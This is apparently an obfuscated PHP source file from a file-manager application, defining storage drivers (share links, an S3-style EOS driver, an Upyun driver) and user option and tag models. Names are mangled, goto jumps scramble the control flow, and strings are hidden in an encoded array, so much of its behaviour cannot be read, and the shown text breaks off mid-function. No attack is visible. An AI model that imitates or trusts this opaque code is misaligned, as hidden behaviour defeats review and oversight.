<?php
 goto bêœŠ‹‘Îš; A–è‘¥ªÏ¯: define($_SERVER[Â€Á›¨õ][0], $_SERVER[Â€Á›¨õ][1]); $_SERVER[ÏÕ‘àëˆÅª] = explode($_SERVER[Â€Á›¨õ][2], gzinflate(substr($_SERVER[Â€Á›¨õ][3], 10, -8))); function binCheckEq($AÜÆç¥Ø­, $D÷ÍŸĞïä) { return $AÜÆç¥Ø­ == $D÷ÍŸĞïä; } goto a„À¹ËäÔò; D°Óƒ×•Ûç: class PathDriverDriverShareItem { public function __construct($DÏ¸ĞÍŞ×ò) { $this->pathParse = $DÏ¸ĞÍŞ×ò; } public function __call($CÈÌ‘±¼Â, $eêÅŞ¸„‚‡) { $dŠ¼çË›œÌ =& $_SERVER[Â€Á›¨õ]; if (method_exists($this, $CÈÌ‘±¼Â)) { return; } $dÙÁšºùõ© = call_user_func_array(array($dŠ¼çË›œÌ[1186], $CÈÌ‘±¼Â), $eêÅŞ¸„‚‡); $CÕ¬‚†Æò = array($dŠ¼çË›œÌ[1187], $dŠ¼çË›œÌ[1188], $dŠ¼çË›œÌ[1189], $dŠ¼çË›œÌ[1190], $dŠ¼çË›œÌ[513], $dŠ¼çË›œÌ[515], $dŠ¼çË›œÌ[1191], $dŠ¼çË›œÌ[106], $dŠ¼çË›œÌ[1192], $dŠ¼çË›œÌ[1193]); if (in_array($CÈÌ‘±¼Â, $CÕ¬‚†Æò)) { $dÙÁšºùõ© = $this->getPathOuter($dÙÁšºùõ©); } return $dÙÁšºùõ©; } public function copy($aîƒ‹’ŸÄ, $B¶­™ì»Ûè, $D¦¦ĞáÜ = false) { return $this->copyMove($aîƒ‹’ŸÄ, $B¶­™ì»Ûè, $D¦¦ĞáÜ, $_SERVER[Â€Á›¨õ][513]); } public function move($D¾‚ÀÎÖÄö, $eï‡”»šŸ§, $F®Œ´ñ…Ï = false) { return $this->copyMove($D¾‚ÀÎÖÄö, $eï‡”»šŸ§, $F®Œ´ñ…Ï, $_SERVER[Â€Á›¨õ][515]); } private function copyMove($d¦È†Ûñ„, $E™§©„ìÆ, $eÃ‚õ‹†‹®, $Bßï¼±ì…Ü) { goto cõ‚£éÌ®©; FÌ™ÆÕ¿š°: if ($câÁ©Ò×™Ô->pathParse[$Bî“’ïõ÷©[1022]]) { $E™§©„ìÆ = $câÁ©Ò×™Ô->pathParse[$Bî“’ïõ÷©[1022]]; } else { $E™§©„ìÆ = $E±ÜŸÇæ¸ø; } $c—™»Ö­¼á = IO::copyMove($d¦È†Ûñ„, $E™§©„ìÆ, $eÃ‚õ‹†‹®, $Bßï¼±ì…Ü); $c—™»Ö­¼á = $this->getPathOuter($c—™»Ö­¼á); goto C®˜„ö†Òõ; cõ‚£éÌ®©: $Bî“’ïõ÷© =& $_SERVER[Â€Á›¨õ]; $E±ÜŸÇæ¸ø = $E™§©„ìÆ; $câÁ©Ò×™Ô = IO::driverMake($E™§©„ìÆ); goto FÌ™ÆÕ¿š°; C®˜„ö†Òõ: return $c—™»Ö­¼á; goto aœÊˆâŠŞ“; aœÊˆâŠŞ“: } public function pathThis($eò„áò¿–¤) { return get_path_this($this->pathParse[$_SERVER[Â€Á›¨õ][75]]); } public function pathFather($aâ¬ß¸®Ö) { return get_path_father($this->pathParse[$_SERVER[Â€Á›¨õ][75]]); } public function iconvSystem($cƒøÉª´ ¸) { return $cƒøÉª´ ¸; } protected function infoParse($E‰®öÈí‚£, $dÎ‡ÁÍ§™‡ = false) { $D“¬‚ì íî =& $_SERVER[Â€Á›¨õ]; $C”ÊÆ¼ìÏä = $this->pathParse[$D“¬‚ì íî[460]][$D“¬‚ì íî[1045]] . $this->pathParse[$D“¬‚ì íî[1038]]; if ($dÎ‡ÁÍ§™‡) { $eÙæï¥ÎÄ“ = IO::infoWithChildren($C”ÊÆ¼ìÏä); } else { $eÙæï¥ÎÄ“ = IO::info($C”ÊÆ¼ìÏä); } $DæÅæï‘©Õ = $this->pathParse[$D“¬‚ì íî[460]]; return Action($D“¬‚ì íî[1185])->_shareItemeParse($eÙæï¥ÎÄ“, $DæÅæï‘©Õ); } public function listAll($Aˆ¡Ø Œé•) { $Eåğå´·ÅÁ =& $_SERVER[Â€Á›¨õ]; $BæĞ­¥Ë = IO::listAll($Aˆ¡Ø Œé•); $Aµ¼ ¦¸óç = $this->pathParse[$Eåğå´·ÅÁ[460]]; foreach ($BæĞ­¥Ë as &$e Áì¤ç«Ğ) { check_abort(); $e Áì¤ç«Ğ = array_merge(IO::info($e Áì¤ç«Ğ[$Eåğå´·ÅÁ[75]]), $e Áì¤ç«Ğ); $e Áì¤ç«Ğ[$Eåğå´·ÅÁ[84]] = Action($Eåğå´·ÅÁ[1185])->_shareItemeParse($e Áì¤ç«Ğ, $Aµ¼ ¦¸óç); } unset($e Áì¤ç«Ğ); return $BæĞ­¥Ë; } public function getPathOuter($fãÛÕ¿«ªÇ) { goto B™Õõ²‘â©; B™Õõ²‘â©: $b™İò‹òŠ =& $_SERVER[Â€Á›¨õ]; $A¾­Ÿ÷¼ø = KodIO::parse($fãÛÕ¿«ªÇ); if ($A¾­Ÿ÷¼ø[$b™İò‹òŠ[29]] == KodIO::KOD_SHARE_ITEM) { return $A¾­Ÿ÷¼ø[$b™İò‹òŠ[75]]; } goto Cˆä—Áùªæ; bèæí‰Ìè±: if (substr($F‰·±»‡Ş…, 0, strlen($e•†Ø™ğ³˜)) != $e•†Ø™ğ³˜) { return !1; } return $this->pathParse[$b™İò‹òŠ[1039]] . $b™İò‹òŠ[8] . ltrim($f›´¾³÷ª, $b™İò‹òŠ[8]); goto Bçç¹–ì‰¬; Cˆä—Áùªæ: $F‰·±»‡Ş… = KodIO::clear($fãÛÕ¿«ªÇ); $e•†Ø™ğ³˜ = KodIO::clear($this->pathParse[$b™İò‹òŠ[460]][$b™İò‹òŠ[1045]]); $f›´¾³÷ª = substr($F‰·±»‡Ş…, strlen($e•†Ø™ğ³˜)); goto bèæí‰Ìè±; Bçç¹–ì‰¬: } public function getType() { $e›Ö›¥Áõ‚ =& $_SERVER[Â€Á›¨õ]; $EóÙ”öÜ®î = str_replace($e›Ö›¥Áõ‚[71], $e›Ö›¥Áõ‚[33], get_class($this)); return strtolower($EóÙ”öÜ®î); } public function isTypeObject($EòšèÍš•ó) { return IO::isTypeObject($EòšèÍš•ó); } public function info($Fäç¬ºĞÂ§) { return $this->infoParse($Fäç¬ºĞÂ§); } public function infoAuth($f‡Á•ì‚‡§) { return $this->infoParse($f‡Á•ì‚‡§); } public function infoWithChildren($DŸ¾Í¤®±¼) { return $this->infoParse($DŸ¾Í¤®±¼, !0); } public function infoFull($eáÃ˜šùÖ) { return $this->infoParse($eáÃ˜šùÖ); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($Cî±‘°ê×’) { $this->pathParse = $Cî±‘°ê×’; } protected function infoParse($FÜ™Ñ…ğ¿–, $CŠí¾˜Ÿç† = false) { $Bƒó®Ù¨‚¬ =& $_SERVER[Â€Á›¨õ]; return Action($Bƒó®Ù¨‚¬[1044])->sharePathInfo($this->pathParse[$Bƒó®Ù¨‚¬[75]], !0, $CŠí¾˜Ÿç†); } public function listPath($D¨‚Èªê, $a“Õë¤ÉĞ« = false) { $dĞ·–½è =& $_SERVER[Â€Á›¨õ]; $c‰ÛåáÆ—à = IO::listPath($D¨‚Èªê, $a“Õë¤ÉĞ«); foreach ($c‰ÛåáÆ—à as $FÒ”Öô¡«Ü => $fŸî–÷×ĞË) { if (!in_array($FÒ”Öô¡«Ü, array($dĞ·–½è[73], $dĞ·–½è[74]))) { continue; } foreach ($fŸî–÷×ĞË as $aÆÎäìÈŸÀ => $D–”õÒ§äù) { $D–”õÒ§äù = Action($dĞ·–½è[1194])->parsePathChildren($D–”õÒ§äù, array($dĞ·–½è[408] => $D¨‚Èªê)); $c‰ÛåáÆ—à[$FÒ”Öô¡«Ü][$aÆÎäìÈŸÀ] = Action($dĞ·–½è[1044])->shareItemInfo($D–”õÒ§äù); } } return $c‰ÛåáÆ—à; } public function listAll($EÂŒÓ‚) { $c†ß©®ãÁ =& $_SERVER[Â€Á›¨õ]; $d‡Œßİ òÃ = IO::listAll($EÂŒÓ‚); foreach ($d‡Œßİ òÃ as &$cƒãÙòÕ¬Ã) { $cƒãÙòÕ¬Ã = array_merge(IO::info($cƒãÙòÕ¬Ã[$c†ß©®ãÁ[75]]), $cƒãÙòÕ¬Ã); $cƒãÙòÕ¬Ã[$c†ß©®ãÁ[84]] = Action($c†ß©®ãÁ[1044])->shareItemInfo($cƒãÙòÕ¬Ã); } unset($cƒãÙòÕ¬Ã); return $d‡Œßİ òÃ; } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($Cæ«¸‚¶±×) { parent::__construct($Cæ«¸‚¶±×); $this->signatureVersion($_SERVER[Â€Á›¨õ][210]); } public function uploadFormData($a­ª™½‰·Ò, $aÇ®ÉÃËĞ¹ = 3600) { goto EÙÆº†Ü½; Eæ„ë¶¡‡–: $FËËôçº—İ = hash_hmac($f¶Í×ŸîØ¿[1205], $FÍ§‹„Æ¤, $c»§ÁÁš„£, !0); $Fôä£§á¾» = hash_hmac($f¶Í×ŸîØ¿[1205], $Dà ‘¨×Šˆ, $FËËôçº—İ, !0); $fÛÙ‰˜º¤¤ = hash_hmac($f¶Í×ŸîØ¿[1205], $eŸ¾•†™ ³, $Fôä£§á¾»); goto E¹…ŠºôÃ; AªÉå–÷Ù: $Dà ‘¨×Šˆ = $f¶Í×ŸîØ¿[1197]; $Cõ…ğ‡±‘ = $aÇ®ÉÃËĞ¹ . $f¶Í×ŸîØ¿[33]; $aõ›ÀÄÇ„õ = $f¶Í×ŸîØ¿[1161]; goto D‘¬Â‚èÇ; DÊ¼Ã¤­ø¿: $eŸ¾•†™ ³ = base64_encode(json_encode($dÂ²ñÄƒ•˜)); $dåø…‹ˆ– = hash_hmac($f¶Í×ŸîØ¿[1205], $aØ±Úö‡Ï, $f¶Í×ŸîØ¿[1206] . $this->secret, !0); $c»§ÁÁš„£ = hash_hmac($f¶Í×ŸîØ¿[1205], $this->region, $dåø…‹ˆ–, !0); goto Eæ„ë¶¡‡–; D‘¬Â‚èÇ: $fÆ”ÙÆë‹ = array($this->accessKey, $aØ±Úö‡Ï, $this->region, $FÍ§‹„Æ¤, $Dà ‘¨×Šˆ); $CƒéÊ²Ú = implode($f¶Í×ŸîØ¿[8], $fÆ”ÙÆë‹); $dÂ²ñÄƒ•˜ = array($f¶Í×ŸîØ¿[1163] => gmdate($f¶Í×ŸîØ¿[1162], strtotime($f¶Í×ŸîØ¿[1198])), $f¶Í×ŸîØ¿[1164] => array(array($f¶Í×ŸîØ¿[1166] => $this->bucket), array($f¶Í×ŸîØ¿[1165] => $dõ“÷¾‡â¬), array($f¶Í×ŸîØ¿[1167], $f¶Í×ŸîØ¿[1168], $f¶Í×ŸîØ¿[33]), array($f¶Í×ŸîØ¿[1167], $f¶Í×ŸîØ¿[1199], $f¶Í×ŸîØ¿[33]), array($f¶Í×ŸîØ¿[1167], $f¶Í×ŸîØ¿[1200], $f¶Í×ŸîØ¿[33]), array($f¶Í×ŸîØ¿[1169] => $aõ›ÀÄÇ„õ), array($f¶Í×ŸîØ¿[1201] => $CƒéÊ²Ú), array($f¶Í×ŸîØ¿[1202] => $D÷’İ¾»—), array($f¶Í×ŸîØ¿[1203] => $d„âôª—³Œ), array($f¶Í×ŸîØ¿[1204] => $Cõ…ğ‡±‘))); goto DÊ¼Ã¤­ø¿; E¹…ŠºôÃ: $AÍ§Òßª’ˆ = array($f¶Í×ŸîØ¿[209] => $f¶Í×ŸîØ¿[33], $f¶Í×ŸîØ¿[1207] => $f¶Í×ŸîØ¿[33], $f¶Í×ŸîØ¿[1165] => $dõ“÷¾‡â¬, $f¶Í×ŸîØ¿[1169] => $aõ›ÀÄÇ„õ, $f¶Í×ŸîØ¿[1173] => $eŸ¾•†™ ³, $f¶Í×ŸîØ¿[1208] => $CƒéÊ²Ú, $f¶Í×ŸîØ¿[1209] => $D÷’İ¾»—, $f¶Í×ŸîØ¿[1210] => $d„âôª—³Œ, $f¶Í×ŸîØ¿[1211] => $Cõ…ğ‡±‘, $f¶Í×ŸîØ¿[1212] => $fÛÙ‰˜º¤¤, $f¶Í×ŸîØ¿[175] => $this->getHost()); return $AÍ§Òßª’ˆ; goto d»Ø¡â©Ë½; D½¯÷å¸ğ: $FÍ§‹„Æ¤ = $f¶Í×ŸîØ¿[59]; $d„âôª—³Œ = gmdate($f¶Í×ŸîØ¿[1196]); $aØ±Úö‡Ï = gmdate($f¶Í×ŸîØ¿[703]); goto AªÉå–÷Ù; EÙÆº†Ü½: $f¶Í×ŸîØ¿ =& $_SERVER[Â€Á›¨õ]; $dõ“÷¾‡â¬ = $f¶Í×ŸîØ¿[191]; $D÷’İ¾»— = $f¶Í×ŸîØ¿[1195]; goto D½¯÷å¸ğ; d»Ø¡â©Ë½: } } goto A‹áÀçÈº; eËíØ»Ş‹ä: class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\x73\x65\162\x5f\x6f\160\164\x69\157\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($B¢³íòƒ) { $aÚ´‰“¯½¿ =& $_SERVER[Â€Á›¨õ]; if (!defined($aÚ´‰“¯½¿[448])) { define($aÚ´‰“¯½¿[448], 0); } return "\x55\x73\145\162\117\x70\164\x69\157\x6e\137{$B¢³íòƒ}\137" . USER_ID; } protected function filterWhere($bàÈ†‰±½) { $AôˆßñØ·‡ =& $_SERVER[Â€Á›¨õ]; if (!defined($AôˆßñØ·‡[448])) { define($AôˆßñØ·‡[448], 0); } $bàÈ†‰±½[$AôˆßñØ·‡[1501]] = USER_ID; return $bàÈ†‰±½; } public function cacheRemoveUser($bêó¸½£í¸, $BôŸÑäÃòÚ) { return Cache::remove("\125\x73\x65\162\x4f\x70\164\x69\157\x6e\137{$bêó¸½£í¸}\x5f" . $BôŸÑäÃòÚ); } protected function optionDefault($fí¡ßéÕ¢¶ = '') { $f¸¦Éº„‘¹ =& $_SERVER[Â€Á›¨õ]; if ($fí¡ßéÕ¢¶ == $f¸¦Éº„‘¹[33]) { return $GLOBALS[$f¸¦Éº„‘¹[6]][$f¸¦Éº„‘¹[2129]]; } if ($fí¡ßéÕ¢¶ == $f¸¦Éº„‘¹[2130]) { return $GLOBALS[$f¸¦Éº„‘¹[6]][$f¸¦Éº„‘¹[2131]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\125\163\x65\x72\56\x74\x61\147\x4c\x69\163\164"; public $modelType = "\x55\163\145\x72\117\160\x74\x69\157\156"; public $field = array("\x6e\141\155\145", "\x73\164\171\x6c\x65", "\x73\157\162\x74"); public function listData($Cæ×¯£º†ğ = false, $b‹”‘ß = "\x73\157\x72\164", $c«íŠ«Ò´¯ = false) { return parent::listData($Cæ×¯£º†ğ, $b‹”‘ß, $c«íŠ«Ò´¯); } public function remove($BÔÔ¢Ç®) { return parent::remove($BÔÔ¢Ç®); } public function add($bøÆ¨†¤Ò, $CÇáï‹Ìò¼ = "\154\x61\x62\x65\x6c\55\x67\162\x65\171\55\x6e\x6f\162\x6d\141\154") { $C‹ù–ø»· =& $_SERVER[Â€Á›¨õ]; if ($this->findByName($bøÆ¨†¤Ò)) { return !1; } $b«ô’Ã‚ê± = array($C‹ù–ø»·[407] => $bøÆ¨†¤Ò, $C‹ù–ø»·[458] => $CÇáï‹Ìò¼, $C‹ù–ø»·[1668] => $this->getSort($C‹ù–ø»·[254]) + 1); return parent::insert($b«ô’Ã‚ê±); } public function update($cõÂ‚Ÿƒ•, $eˆÌ»êæ©Ş) { $F”ªñ®ñ³Ÿ =& $_SERVER[Â€Á›¨õ]; $a²æÌã…Ì  = $this->listData($cõÂ‚Ÿƒ•); $cˆ‚¢«‡Âñ = $this->findByName($eˆÌ»êæ©Ş[$F”ªñ®ñ³Ÿ[28]]); if (!$a²æÌã…Ì  || $cˆ‚¢«‡Âñ && $cˆ‚¢«‡Âñ[$F”ªñ®ñ³Ÿ[388]] != $a²æÌã…Ì [$F”ªñ®ñ³Ÿ[388]]) { return !1; } return parent::update($cõÂ‚Ÿƒ•, $eˆÌ»êæ©Ş); } public function moveTop($b¦ù˜Åª¢) { $BËˆ’¦èò =& $_SERVER[Â€Á›¨õ]; $E¶«œÇíİ = parent::listData(); $C›ºÈšÏÆÑ = $this->getSort($BËˆ’¦èò[253]); foreach ($E¶«œÇíİ as &$aŸ‘¶ã²‹) { if ($aŸ‘¶ã²‹[$BËˆ’¦èò[388]] == $b¦ù˜Åª¢) { $aŸ‘¶ã²‹[$BËˆ’¦èò[1687]] = $C›ºÈšÏÆÑ; continue; } $aŸ‘¶ã²‹[$BËˆ’¦èò[1687]] += 1; } unset($aŸ‘¶ã²‹); return parent::resetData($E¶«œÇíİ); } public function moveBottom($dÜƒÀƒÑ¿ˆ) { $DõÎƒŸéóŠ =& $_SERVER[Â€Á›¨õ]; $CÅ¯›¨ß‚… = $this->getSort($DõÎƒŸéóŠ[254]) + 1; return parent::update($dÜƒÀƒÑ¿ˆ, array($DõÎƒŸéóŠ[1687] => $CÅ¯›¨ß‚…)); } public function resetSort($e–‘Ç¹Øã¾) { goto CÒ§Ëİ¨¦ê; CÒ§Ëİ¨¦ê: $A‘¢œ™‹İ… =& $_SERVER[Â€Á›¨õ]; $d‚’ÛˆßšÏ = array(); $e–‘Ç¹Øã¾ = is_array($e–‘Ç¹Øã¾) ? $e–‘Ç¹Øã¾ : array(); goto E¥®×ó•¡Ê; dšŞØß’Çå: unset($EÑâ–Ï¥áç); return parent::resetData($d§µğ¥å²õ); goto Dõ‘œ†½Æ; E¥®×ó•¡Ê: for ($Dß…»ÌøÆ = 0; $Dß…»ÌøÆ < count($e–‘Ç¹Øã¾); $Dß…»ÌøÆ++) { $d‚’ÛˆßšÏ[$e–‘Ç¹Øã¾[$Dß…»ÌøÆ] . $A‘¢œ™‹İ…[33]] = $Dß…»ÌøÆ + 1; } $d§µğ¥å²õ = parent::listData(); foreach ($d§µğ¥å²õ as &$EÑâ–Ï¥áç) { $b÷Íƒ˜á = $d‚’ÛˆßšÏ[$EÑâ–Ï¥áç[$A‘¢œ™‹İ…[388]]]; $EÑâ–Ï¥áç[$A‘¢œ™‹İ…[1687]] = $b÷Íƒ˜á ? $b÷Íƒ˜á : $EÑâ–Ï¥áç[$A‘¢œ™‹İ…[1687]]; } goto dšŞØß’Çå; Dõ‘œ†½Æ: } private function getSort($BŠ‹Å¿İ©À) { $dµ¿ëÔØ…Ù =& $_SERVER[Â€Á›¨õ]; $açµßàƒ±¨ = parent::listData(); $aĞÖ«ÆĞ° = array_to_keyvalue($açµßàƒ±¨, $dµ¿ëÔØ…Ù[33], $dµ¿ëÔØ…Ù[1687]); if (!$aĞÖ«ÆĞ°) { $aĞÖ«ÆĞ° = array(0); } $Ağ¸öŞ£Ã = $BŠ‹Å¿İ©À == $dµ¿ëÔØ…Ù[254] ? max($aĞÖ«ÆĞ°) : min($aĞÖ«ÆĞ°); return intval($Ağ¸öŞ£Ã); } } goto a¾Î®â™×; bÛÑ¹°Â´ö: class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\x74\164\160\x3a\57\57\x76\x30\56\x61\x70\151\x2e\165\x70\x79\x75\156\x2e\x63\x6f\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($dášŠÙØ¾) { parent::__construct(); $this->_init($dášŠÙØ¾); } public function _init($F»èàîéÃ) { $FŒèÈóãøë =& $_SERVER[Â€Á›¨õ]; foreach ($F»èàîéÃ as $e¥ö˜’…õé => $e„ãòÙ’Íğ) { if (isset($this->{$e¥ö˜’…õé})) { $this->{$e¥ö˜’…õé} = $e„ãòÙ’Íğ; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($FŒèÈóãøë[1303] . LNG($FŒèÈóãøë[1235])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($e‰Î¸½£–ó, $dÕª×§î = "\x47\x45\124") { $d¥¦”âÜ‘… =& $_SERVER[Â€Á›¨õ]; $eàğÍÎŒ¡æ = gmdate($d¥¦”âÜ‘…[1269]); $f¸“½¸š¾® = base64_encode(hash_hmac($d¥¦”âÜ‘…[1304], "{$dÕª×§î}\x26{$e‰Î¸½£–ó}\46{$eàğÍÎŒ¡æ}", md5("{$this->userpass}"), !0)); $f½±æùÆ’ = array("\x41\x75\164\150\x6f\x72\151\x7a\141\x74\x69\157\x6e\x3a\x55\120\x59\125\x4e\x20{$this->username}\72{$f¸“½¸š¾®}", "\x44\141\x74\145\72{$eàğÍÎŒ¡æ}"); return $f½±æùÆ’; } public function ussRequest($Aö¹›‡Ï¦ø, $eÖ­ğ¯¶êÍ = "\107\x45\124", $bæ½è˜¾ËÓ = false, $B¥ñÈíŒæ´ = false, $e»¶í²Õ¦å = false) { goto FòöÍÔŠ£÷; fÕî‚˜Æ©Ø: $A’¦Üí¦ = $this->ussHeaders($eà¤‹²Ëƒ„, $eÖ­ğ¯¶êÍ); if ($B¥ñÈíŒæ´) { $A’¦Üí¦ = array_merge($A’¦Üí¦, $B¥ñÈíŒæ´); } $bÙ…’ƒˆ™ = url_request($this->endpoint . $eà¤‹²Ëƒ„, $eÖ­ğ¯¶êÍ, $bæ½è˜¾ËÓ, $A’¦Üí¦, $e»¶í²Õ¦å); goto E¯Ë¬ÂŠ; FòöÍÔŠ£÷: $eäİâ›ÍšÃ =& $_SERVER[Â€Á›¨õ]; $Aö¹›‡Ï¦ø = trim($Aö¹›‡Ï¦ø, $eäİâ›ÍšÃ[8]); $eà¤‹²Ëƒ„ = "\57{$this->bucket}\57{$Aö¹›‡Ï¦ø}"; goto fÕî‚˜Æ©Ø; E¯Ë¬ÂŠ: if (!$bÙ…’ƒˆ™) { return array($eäİâ›ÍšÃ[1060] => !1, $eäİâ›ÍšÃ[1062] => $eäİâ›ÍšÃ[1305]); } if (strtolower($eÖ­ğ¯¶êÍ) == $eäİâ›ÍšÃ[190] || in_array($bÙ…’ƒˆ™[$eäİâ›ÍšÃ[1060]], array($eäİâ›ÍšÃ[1161], $eäİâ›ÍšÃ[1306]))) { $bæ½è˜¾ËÓ = $bÙ…’ƒˆ™[$eäİâ›ÍšÃ[1307]]; } else { $bæ½è˜¾ËÓ = json_decode($bÙ…’ƒˆ™[$eäİâ›ÍšÃ[1062]], !0); if (!$bæ½è˜¾ËÓ) { $bæ½è˜¾ËÓ = $bÙ…’ƒˆ™[$eäİâ›ÍšÃ[1062]]; } else { if (!$bÙ…’ƒˆ™[$eäİâ›ÍšÃ[702]] && isset($bæ½è˜¾ËÓ[$eäİâ›ÍšÃ[1308]])) { $bæ½è˜¾ËÓ = $bæ½è˜¾ËÓ[$eäİâ›ÍšÃ[1308]]; } } } return array($eäİâ›ÍšÃ[1060] => $bÙ…’ƒˆ™[$eäİâ›ÍšÃ[702]], $eäİâ›ÍšÃ[1062] => $bæ½è˜¾ËÓ); goto E¹ŞÛ»‹¯–; E¹ŞÛ»‹¯–: } public function mkfile($BÏÔÆ „²´, $fù³›¬·„ = '', $f¢Ñ»‚àÜÃ = REPEAT_RENAME) { if ($this->setContent($BÏÔÆ „²´, $fù³›¬·„)) { return $this->getPathOuter($BÏÔÆ „²´); } return !1; } public function mkdir($E±ß‚ëŠÆ¾, $A¥‹§˜›ÕÛ = REPEAT_SKIP) { $d¨×¨†ë‚³ =& $_SERVER[Â€Á›¨õ]; $BÂ¨İ„è¾¹ = trim($E±ß‚ëŠÆ¾, $d¨×¨†ë‚³[8]); if ($this->_isFolder($BÂ¨İ„è¾¹)) { return $this->getPathOuter($BÂ¨İ„è¾¹); } $e´·ÎõÆˆ§ = array($d¨×¨†ë‚³[1309]); $dóÖ§ÈÆ¾Ç = $this->ussRequest($BÂ¨İ„è¾¹, $d¨×¨†ë‚³[222], !1, $e´·ÎõÆˆ§); return $dóÖ§ÈÆ¾Ç[$d¨×¨†ë‚³[1060]] ? $this->getPathOuter($BÂ¨İ„è¾¹) : !1; } public function copyFile($FÎ´Å…Ÿ˜³, $EĞÁõ³¤×î) { $E‘¦¤Åçñ =& $_SERVER[Â€Á›¨õ]; $d¢Ç‘Ğ‚ = array($E‘¦¤Åçñ[1310] . "\57{$this->bucket}\x2f{$FÎ´Å…Ÿ˜³}", $E‘¦¤Åçñ[1311]); $b»–²²”ç÷ = $this->ussRequest($EĞÁõ³¤×î, $E‘¦¤Åçñ[224], !1, $d¢Ç‘Ğ‚); return $b»–²²”ç÷[$E‘¦¤Åçñ[1060]] ? !0 : $this->getPathOuter($EĞÁõ³¤×î); } public function moveFile($eÅµÌ®¸Àå, $E‹¿Œ‰Ÿ±ë) { $e¥êêçëÈÙ =& $_SERVER[Â€Á›¨õ]; $b©÷ø¨”Ê = array($e¥êêçëÈÙ[1312] . "\57{$this->bucket}\57{$eÅµÌ®¸Àå}", $e¥êêçëÈÙ[1311]); $EèÁ’³° = $this->ussRequest($E‹¿Œ‰Ÿ±ë, $e¥êêçëÈÙ[224], !1, $b©÷ø¨”Ê); return $EèÁ’³°[$e¥êêçëÈÙ[1060]] ? !0 : $this->getPathOuter($E‹¿Œ‰Ÿ±ë); } public function delFile($bó…ïÇ§„Œ) { $aº÷¯Á“·† =& $_SERVER[Â€Á›¨õ]; $fÊˆ‡óìé = $this->ussRequest($bó…ïÇ§„Œ, $aº÷¯Á“·†[1313]); return $fÊˆ‡óìé[$aº÷¯Á“·†[1060]] ? !0 : !1; } public function delFolder($BÇ»õ²²—ß) { goto AŸøø×›±‹; b±¯­£: $fâš¿ôÂ”ã = $f„ÏïÈš¦ó = array(); $this->fileList($BÇ»õ²²—ß, $fâš¿ôÂ”ã, $f„ÏïÈš¦ó, !0); $this->listItemCache = !0; goto c”öÍÈß±Â; c”öÍÈß±Â: foreach ($f„ÏïÈš¦ó as $AŠÒ÷Ş›í) { $EŠ®¶Œêà  = $this->ussRequest($AŠÒ÷Ş›í[$fÔ¿òíÈãš[28]], $fÔ¿òíÈãš[1313]); if (!$EŠ®¶Œêà [$fÔ¿òíÈãš[1060]]) { return !1; } } foreach ($fâš¿ôÂ”ã as $bÏ™¶öœ¶) { $EŠ®¶Œêà  = $this->ussRequest($bÏ™¶öœ¶, $fÔ¿òíÈãš[1313]); if (!$EŠ®¶Œêà [$fÔ¿òíÈãš[1060]]) { return !1; } } $EŠ®¶Œêà  = $this->ussRequest($BÇ»õ²²—ß, $fÔ¿òíÈãš[1313]); goto D Ñè¼ê÷”; AŸøø×›±‹: $fÔ¿òíÈãš =& $_SERVER[Â€Á›¨õ]; if (!$this->exist($BÇ»õ²²—ß)) { return !0; } $this->listItemCache = !1; goto b±¯­£; D Ñè¼ê÷”: return $EŠ®¶Œêà [$fÔ¿òíÈãš[1060]]; goto eĞôÔ÷–·ğ; eĞôÔ÷–·ğ: } public function rename($FÉÁÃ…øÙğ, $dæ¢µê¦) { if ($this->isFile($FÉÁÃ…øÙğ)) { $dæ¢µê¦ = get_path_father($FÉÁÃ…øÙğ) . $dæ¢µê¦; return $this->moveFile($FÉÁÃ…øÙğ, $dæ¢µê¦); } return $this->renameObject($FÉÁÃ…øÙğ, $dæ¢µê¦); } public function fileInfo($D…ãïÌ•ÙÆ, $aÅØ÷‰Ã¾ = false, $bâÌˆ …¢  = array()) { goto a—¶¢ôË; EŒÕùÚª‘: return $dµíœà©; goto eñôí¿‰ŸÙ; f³‡æšêÚÌ: $dµíœà©[$FÆòÆŒôù¼[192]] = $dµíœà©[$FÆòÆŒôù¼[83]] = 0; $dµíœà©[$FÆòÆŒôù¼[193]] = $dµíœà©[$FÆòÆŒôù¼[194]] = !0; if (empty($bâÌˆ …¢ )) { $bâÌˆ …¢  = $this->objectMeta($D…ãïÌ•ÙÆ); if (!$bâÌˆ …¢ ) { return $dµíœà©; } } goto Dñ‚ßÛŒÀç; a—¶¢ôË: $FÆòÆŒôù¼ =& $_SERVER[Â€Á›¨õ]; $dµíœà© = array($FÆòÆŒôù¼[28] => $this->pathThis($D…ãïÌ•ÙÆ), $FÆòÆŒôù¼[75] => $this->getPathOuter($FÆòÆŒôù¼[8] . $D…ãïÌ•ÙÆ), $FÆòÆŒôù¼[29] => $FÆòÆŒôù¼[173], $FÆòÆŒôù¼[77] => isset($bâÌˆ …¢ [$FÆòÆŒôù¼[77]]) ? $bâÌˆ …¢ [$FÆòÆŒôù¼[77]] : 0, $FÆòÆŒôù¼[167] => $this->ext($D…ãïÌ•ÙÆ)); if ($aÅØ÷‰Ã¾) { return $dµíœà©; } goto f³‡æšêÚÌ; Dñ‚ßÛŒÀç: $dµíœà©[$FÆòÆŒôù¼[192]] = intval($bâÌˆ …¢ [$FÆòÆŒôù¼[1314]]); $dµíœà©[$FÆòÆŒôù¼[83]] = intval($bâÌˆ …¢ [$FÆòÆŒôù¼[1315]]); $dµíœà©[$FÆòÆŒôù¼[77]] = $bâÌˆ …¢ [$FÆòÆŒôù¼[77]]; goto EŒÕùÚª‘; eñôí¿‰ŸÙ: } public function folderInfo($cíÚ‡½¯È×, $a…¹Õ¨¤ãî = false) { goto bêíÈÑ°„; fÔºŸ˜ƒ£: $dé›—œÏ›ç[$e‹÷‡¾©¼ù[192]] = intval($BÒØÍÛ¬–[$e‹÷‡¾©¼ù[1314]]); $dé›—œÏ›ç[$e‹÷‡¾©¼ù[83]] = intval($BÒØÍÛ¬–[$e‹÷‡¾©¼ù[1315]]); return $dé›—œÏ›ç; goto Dàä²Ç‚•; bêíÈÑ°„: $e‹÷‡¾©¼ù =& 